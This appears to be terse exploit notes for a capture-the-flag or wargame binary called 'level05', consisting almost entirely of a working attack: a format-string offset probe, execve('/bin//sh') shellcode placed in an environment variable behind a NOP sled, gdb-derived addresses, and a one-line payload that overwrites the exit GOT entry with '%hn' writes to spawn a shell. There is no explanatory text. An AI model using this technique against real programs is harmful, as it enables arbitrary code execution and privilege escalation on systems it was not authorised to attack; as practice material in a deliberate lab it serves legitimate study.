BBBB %10$x

0xffffce3e environ

\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80

export SHELLCODE=`python -c 'print 1024*"\x90" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`

shellcode addr (gdb) : 0xffffd632
                        65535 54834
                        65527 54826

exit got.plt : 0x080497e0

(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54826d%10$hn" + "%10701d%11$hn"'; cat) | ./level05

r < <(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54826d%10$hn" + "%10701d%11$hn"')


